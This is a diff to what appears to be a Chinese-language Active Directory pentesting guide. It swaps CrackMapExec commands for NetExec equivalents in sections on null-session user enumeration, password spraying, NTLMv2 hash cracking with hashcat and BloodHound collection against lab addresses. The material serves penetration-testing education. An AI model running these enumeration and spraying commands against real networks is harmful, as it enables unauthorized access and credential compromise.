@@ -55,9 +55,9 @@ rpcclient> querydispinfo
 ### 方法三：從 SMB / LDAP 枚舉
 
 ```bash
-# CrackMapExec
-crackmapexec smb 10.10.10.x --users
-crackmapexec smb 10.10.10.x -u '' -p '' --users   # Null session
+# NetExec（nxc）— 舊 writeup 的 crackmapexec/cme 指令可直接換成 nxc
+nxc smb 10.10.10.x --users
+nxc smb 10.10.10.x -u '' -p '' --users   # Null session
 
 # ldapsearch（Null Bind）
 ldapsearch -x -H ldap://10.10.10.x -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
@@ -88,10 +88,10 @@ Summer2023, Fall2023, Winter2024
     'Password123'
 ```
 
-### CrackMapExec spray
+### NetExec spray
 
 ```bash
-crackmapexec smb 10.10.10.x -u users.txt -p 'Password123' --no-bruteforce --continue-on-success
+nxc smb 10.10.10.x -u users.txt -p 'Password123' --no-bruteforce --continue-on-success
 
 # 成功找到：
 # [+] corp.local\alice:Password123 (Pwn3d!) ← 這個帳號有管理員，用 !
@@ -176,10 +176,10 @@ hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
 
 ```bash
 # 確認帳號有效
-crackmapexec smb 10.10.10.x -u alice -p 'Password123'
+nxc smb 10.10.10.x -u alice -p 'Password123'
 
 # 枚舉 AD 資訊
-crackmapexec smb 10.10.10.x -u alice -p 'Password123' --users --groups --shares
+nxc smb 10.10.10.x -u alice -p 'Password123' --users --groups --shares
 
 # 跑 BloodHound 收集器（Ch 33）
 python3 bloodhound.py -u alice -p 'Password123' -d corp.local -dc dc.corp.local -c all
